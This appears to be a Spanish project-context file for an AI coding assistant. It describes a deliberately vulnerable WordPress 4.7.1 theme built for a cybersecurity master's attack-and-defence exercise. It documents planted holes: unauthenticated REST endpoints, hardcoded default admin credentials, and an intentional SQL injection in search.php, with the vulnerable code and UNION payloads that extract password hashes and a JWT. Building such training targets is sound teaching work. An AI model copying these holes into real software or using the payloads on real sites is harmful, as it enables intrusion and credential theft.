# Contexto del proyecto — TecnoStore WordPress Theme
# Última actualización: sesión de desarrollo del tema WordPress (junio 2026)

## Quién eres y qué es esto

Eres el asistente de un **profesor de un máster de ciberseguridad** que está construyendo el proyecto final integrado para tres asignaturas:
- Puesta en producción segura
- Hacking ético
- Respuesta a incidentes de ciberseguridad

El escenario simula la infraestructura de una **pyme de ecommerce de productos informáticos** llamada TecnoStore, que los alumnos deben desplegar en AWS, securizar, documentar y finalmente atacar (a la infraestructura de otro grupo).

La infraestructura completa tiene tres componentes:
1. **WordPress 4.7.1 + tema TecnoStore** — esta carpeta, el ecommerce visible al público
2. **App de gestión de almacén** — Node.js + Express + SQLite, en `/app_almacen/`
3. **ERP interno** — pendiente de implementar

---

## IMPORTANTE: WooCommerce eliminado

El tema **NO usa WooCommerce**. Se eliminó por incompatibilidad con WordPress 4.7.1.
En su lugar hay un **Custom Post Type propio** (`ts_product`) con carrito y checkout simulados en JavaScript.

---

## Por qué WordPress 4.7.1 (obligatorio)

El tema fuerza esta versión porque tiene CVEs documentadas y explotables:
- **CVE-2017-1001000**: inyección de contenido vía REST API sin autenticación (la más importante)
- **CVE-2017-5487**: enumeración de usuarios vía REST API (`/wp-json/wp/v2/users`)
- **CVE-2017-5488 al 5493**: múltiples XSS en el core
- **XML-RPC** habilitado por defecto: permite brute force sin bloqueo

---

## Estructura de archivos del tema

```
tecnostore/
├── style.css                       ← declaración del tema (nombre, versión)
├── functions.php                   ← bootstrap: CPT, taxonomía, páginas, pre_get_posts
├── header.php                      ← cabecera con nav y carrito fake (badge JS)
├── footer.php                      ← pie de página
├── front-page.php                  ← homepage: hero, categorías, productos destacados (CPT)
├── index.php                       ← template fallback
├── page.php                        ← páginas estáticas genéricas
├── archive-ts_product.php          ← catálogo de tienda con filtros por categoría
├── single-ts_product.php           ← ficha de producto con control de cantidad
├── search.php                      ← búsqueda de productos (VULNERABLE A SQLi)
├── page-carrito.php                ← carrito renderizado por JS desde localStorage
├── page-checkout.php               ← checkout fake con validación JS
├── page-pedido-completado.php      ← confirmación de pedido con número aleatorio
├── inc/
│   ├── admin-settings.php          ← panel admin: JWT + URL base almacén + verificación versión WP
│   ├── admin-orders.php            ← panel admin: listado y detalle de pedidos + stats almacén
│   └── endpoints.php               ← endpoints REST: /createProducts (vuln) + /orders
├── assets/
│   ├── css/main.css                ← estilos completos (producto, carrito, checkout, toast, etc.)
│   └── js/main.js                  ← lógica carrito localStorage + checkout + confirmación
├── seed/
│   ├── seed-products.php           ← carga 20 productos IT en 6 categorías (CPT ts_product)
│   └── setup-defaults.php          ← crea usuario developer/masterjoyfe2026 + páginas del flujo
└── CLAUDE_CONTEXT.md               ← este archivo
```

---

## Custom Post Type: ts_product

Registrado en `functions.php` vía `register_post_type()`.

- **Post type**: `ts_product`
- **Archivo**: `/tienda/` (has_archive = true, rewrite slug = 'tienda')
- **Taxonomía**: `ts_product_cat` (jerárquica, slug de archivo = 'categoria')
- **Meta fields** por producto:
  - `_ts_sku` — código de referencia (string)
  - `_ts_price` — precio (float)
  - `_ts_stock` — unidades en stock (int)
- **Helper**: `ts_get_price($post_id)` devuelve float

### Query del archivo (pre_get_posts)
```php
// En functions.php — fija orden estable para paginación
$query->set('orderby', 'title');
$query->set('order',   'ASC');
$query->set('posts_per_page', 12);
```
Sin esto MySQL devuelve filas en orden arbitrario y los productos cambian entre páginas.

---

## Flujo de compra (simulado en JS)

### Cart — localStorage
Clave: `ts_cart`. Estructura:
```json
[{"id": 123, "name": "...", "price": 549.00, "sku": "CPU-I9-13900K", "qty": 1}]
```

Objeto `tsCart` en `main.js`: `add`, `remove`, `updateQty`, `count`, `total`, `clear`, `updateBadge`.

### Páginas del flujo
Las tres páginas se crean automáticamente en WordPress en el primer request tras activar el tema (hook `wp_loaded` con flag `tecnostore_pages_v1`):

| Slug | Template | Función |
|---|---|---|
| `/carrito/` | `page-carrito.php` | Lista items del localStorage, totales, botón checkout |
| `/checkout/` | `page-checkout.php` | Formulario cliente + pago fake (cualquier tarjeta válida) |
| `/pedido-completado/` | `page-pedido-completado.php` | Confirmación con nº pedido aleatorio `TS-YYYY-XXXXX` |

### Flujo de checkout completo
```
Cliente rellena formulario → JS valida campos obligatorios
  → POST /wp-json/tecnostore/v1/orders   (guarda en wp_ts_orders)
    → PHP llama POST /api/sales al almacén  (registra venta + descuenta stock)
  → sessionStorage guarda datos del pedido
  → tsCart.clear()
  → redirect a /pedido-completado/
    → JS lee sessionStorage y muestra nº pedido, email, total, fecha entrega
```

Si el almacén no responde, el pedido se guarda igualmente y el cliente no ve error.

---

## Base de datos: tabla wp_ts_orders

Creada con `dbDelta()` en `after_switch_theme` y en primer `wp_loaded` (flag `tecnostore_orders_v1`).

```sql
CREATE TABLE wp_ts_orders (
    id               bigint(20)    NOT NULL AUTO_INCREMENT,
    order_number     varchar(30)   NOT NULL,        -- TS-2026-XXXXX
    customer_name    varchar(200)  NOT NULL,
    customer_email   varchar(200)  NOT NULL,
    customer_address text          NOT NULL,        -- JSON: {direccion, ciudad, cp, pais}
    items            longtext      NOT NULL,        -- JSON: [{id,name,sku,price,qty}]
    subtotal         decimal(10,2) NOT NULL,
    shipping         decimal(10,2) NOT NULL,
    total            decimal(10,2) NOT NULL,
    status           varchar(30)   NOT NULL DEFAULT 'completado',
    created_at       datetime      NOT NULL,
    PRIMARY KEY (id)
);
```

---

## Panel de administración WordPress

### TecnoStore > Configuración (`inc/admin-settings.php`)
- Verificación de versión WP (requiere exactamente 4.7.1)
- **URL base de la API del almacén** (ej: `http://almacen.internal`) — se almacena en `wp_options` como `tecnostore_warehouse_url`. El tema construye internamente cada endpoint añadiendo la ruta.
- **JWT Token** — se almacena en `tecnostore_warehouse_jwt`
- Muestra los endpoints construidos dinámicamente al guardar la URL base

### TecnoStore > Pedidos (`inc/admin-orders.php`)
**Listado:**
- Barra de stats locales: pedidos totales, facturado, hoy, ticket medio
- Barra de stats del almacén: `GET /api/sales/stats` — ventas, ingresos, ticket medio, unidades descontadas + Top 5 productos
- Tabla de pedidos con Ver / Borrar (borrar usa nonce)

**Detalle de pedido:**
- Tabla de artículos con subtotales
- Datos de cliente y dirección de envío
- Datos del almacén: `GET /api/sales/order/:order_number` — líneas de venta con SKU, cantidad, precio, estado

---

## Endpoints REST del tema

### GET /wp-json/tecnostore/v1/createProducts
**Sin autenticación** (`permission_callback => '__return_true'`).

Llama a `GET {base}/api/products` del almacén con el JWT configurado. Crea o actualiza productos como `ts_product` con meta `_ts_sku`, `_ts_price`, `_ts_stock`. El crontab del servidor llama a este endpoint cada noche.

### POST /wp-json/tecnostore/v1/orders
**Sin autenticación** (`permission_callback => '__return_true'`).

Recibe el pedido del frontend. Guarda en `wp_ts_orders`. Llama a `POST {base}/api/sales` del almacén.

Body esperado del frontend:
```json
{
  "orderNum": "TS-2026-12345",
  "email": "cliente@ejemplo.com",
  "nombre": "Juan", "apellidos": "García",
  "direccion": "...", "ciudad": "...", "cp": "...", "pais": "ES",
  "items": [{"id": 1, "name": "...", "sku": "...", "price": 549.00, "qty": 1}],
  "subtotal": 549.00, "shipping": 0, "total": 549.00
}
```

Body que se envía al almacén (`POST /api/sales`):
```json
{
  "order_id": "TS-2026-12345",
  "customer_email": "cliente@ejemplo.com",
  "status": "completed",
  "items": [{"sku": "CPU-I9-13900K", "name": "...", "quantity": 1, "unit_price": 549.00}]
}
```

Respuesta esperada del almacén:
```json
{"success": true, "registered": 1, "stock_updated": 1, "errors": []}
```

### Helpers internos (inc/endpoints.php)
```php
ts_warehouse_url($path)      // rtrim($base, '/') . '/' . ltrim($path, '/')
ts_warehouse_headers()       // Authorization + Content-Type + Accept
ts_register_sale_in_warehouse($order_number, $email, $items)  // POST /api/sales
```

---

## Endpoints del almacén usados por el tema

| Método | Ruta | Usado en |
|---|---|---|
| `GET` | `/api/products` | `/createProducts` — sincronización de catálogo |
| `POST` | `/api/sales` | Checkout — registra venta y descuenta stock |
| `GET` | `/api/sales/stats` | Admin > Pedidos — barra de estadísticas |
| `GET` | `/api/sales/order/:order_id` | Admin > Detalle pedido — líneas del almacén |

**Endpoints pendientes de integrar** (disponibles en la API del almacén):
- `GET /api/sales` — lista paginada (params: limit, offset, sku, status)
- `GET /api/sales/:id` — una línea de venta concreta
- `PATCH /api/sales/:id/status` — cambiar estado (completed/pending/cancelled/refunded)

---

## Vectores de ataque implementados

### 1. WordPress 4.7.1 obligatorio
CVEs mencionadas arriba son los vectores de entrada principales.

### 2. Usuario administrador por defecto
Script `seed/setup-defaults.php` crea:
- **Login**: `developer`
- **Password**: `masterjoyfe2026`
- **Rol**: administrator

### 3. Endpoint /createProducts sin autenticación
`GET /wp-json/tecnostore/v1/createProducts` — público, cualquiera puede llamarlo.

### 4. Endpoint /orders sin autenticación
`POST /wp-json/tecnostore/v1/orders` — público, permite insertar pedidos falsos en la BD.

### 5. JWT del almacén en el panel admin
Guardado en `wp_options` como `tecnostore_warehouse_jwt`. Visible en el panel TecnoStore > Configuración tras comprometer WordPress.

**Cadena de ataque principal**:
```
CVE-2017-1001000 o credenciales por defecto
  → Acceso panel admin WordPress
    → Leer JWT en TecnoStore > Configuración
      → Llamar directamente a la API del almacén con ese JWT
```

### 6. SQL Injection en el buscador (INTENCIONADA)
Archivo: `search.php`

```php
$search = isset($_GET['s']) ? $_GET['s'] : '';  // sin sanitizar

$results = $wpdb->get_results(
    "SELECT p.ID, p.post_title, p.post_content
     FROM {$wpdb->posts} p
     WHERE p.post_type = 'ts_product'
       AND p.post_status = 'publish'
       AND (p.post_title LIKE '%{$search}%'
            OR p.post_content LIKE '%{$search}%')"
    // sin $wpdb->prepare() — VULNERABLE
);
$wpdb->show_errors(); // errores MySQL visibles
```

**Payloads del ejercicio**:
```
# Bypass WHERE — muestra todos los productos
' OR '1'='1

# UNION — extrae usuarios y hashes (3 columnas)
' UNION SELECT user_login, user_pass, user_email FROM wp_users-- -

# UNION — extrae JWT del almacén desde wp_options
' UNION SELECT option_name, option_value, 1 FROM wp_options WHERE option_name='tecnostore_warehouse_jwt'-- -

# UNION — extrae URL base del almacén
' UNION SELECT option_name, option_value, 1 FROM wp_options WHERE option_name='tecnostore_warehouse_url'-- -
```

La SQLi en el buscador crea una cadena alternativa para llegar al JWT sin necesidad de comprometer el panel de admin.

---

## Scripts de seed

### setup-defaults.php
```bash
wp eval-file wp-content/themes/tecnostore/seed/setup-defaults.php
```
Crea:
- Usuario `developer` / `masterjoyfe2026` con rol `administrator`
- Páginas WordPress: Carrito (`/carrito/`), Checkout (`/checkout/`), Pedido completado (`/pedido-completado/`)
- Flush de rewrite rules

### seed-products.php
```bash
wp eval-file wp-content/themes/tecnostore/seed/seed-products.php
```
Crea 20 productos `ts_product` en 6 categorías `ts_product_cat`: portátiles, componentes, monitores, periféricos, almacenamiento, redes. Idempotente (detecta por `_ts_sku`).

**Orden de ejecución**:
```bash
wp eval-file wp-content/themes/tecnostore/seed/setup-defaults.php
wp eval-file wp-content/themes/tecnostore/seed/seed-products.php
```

Después ir a **Ajustes → Enlaces permanentes → Guardar** para flush de rewrite rules del CPT.

---

## Lo que los alumnos deben hacer con WordPress

**Securización**:
- Actualizar WordPress (conflicto con el tema — dilema intencionado)
- Cambiar credenciales por defecto (`developer`)
- Desactivar XML-RPC
- Añadir autenticación a `/createProducts` y `/orders`
- Proteger el buscador contra SQLi (usar `$wpdb->prepare()`)
- Usar JWT de scope mínimo (`read:products`) para la integración
- Configurar WAF, headers de seguridad, SSL
- Ocultar versión de WordPress

**Lo que encontrarán al atacar**:
- Enumerar usuarios vía `/wp-json/wp/v2/users`
- Explotar CVE-2017-1001000
- Probar credenciales `developer/masterjoyfe2026`
- SQLi en `?s=` para extraer usuarios/hashes/JWT
- Leer JWT del almacén vía panel admin o vía SQLi
- Llamar manualmente a `/wp-json/tecnostore/v1/createProducts`
- Insertar pedidos falsos vía `POST /wp-json/tecnostore/v1/orders`

---

## Diseño del tema

- **Colores**: azul marino (`#0d2137`), azul (`#0066cc`), naranja accent (`#e85d04`)
- **Sin WooCommerce**: CPT propio + carrito localStorage + checkout JS
- **Responsive**: grid 4 columnas desktop → 3 tablet → 2 móvil → 1 pequeño
- **Toast**: notificación al añadir al carrito (JS dinámico, sin HTML hardcodeado)

---

## Estado del proyecto

- [x] Tema WordPress completo sin WooCommerce
- [x] CPT ts_product + taxonomía ts_product_cat
- [x] Carrito y checkout simulados (localStorage + JS)
- [x] Tabla wp_ts_orders en BD
- [x] Panel admin: Pedidos con stats locales + stats almacén
- [x] Integración POST /api/sales al hacer checkout
- [x] SQL Injection intencionada en buscador
- [x] Scripts de seed (productos + usuario + páginas)
- [ ] ERP interno (pendiente — candidatos: Dolibarr, ERPNext, Odoo)
- [ ] Arquitectura AWS de referencia
- [ ] Rúbricas por asignatura
- [ ] Documento de reglas del día del ataque
- [ ] Integrar endpoints pendientes del almacén: GET /api/sales, PATCH /api/sales/:id/status
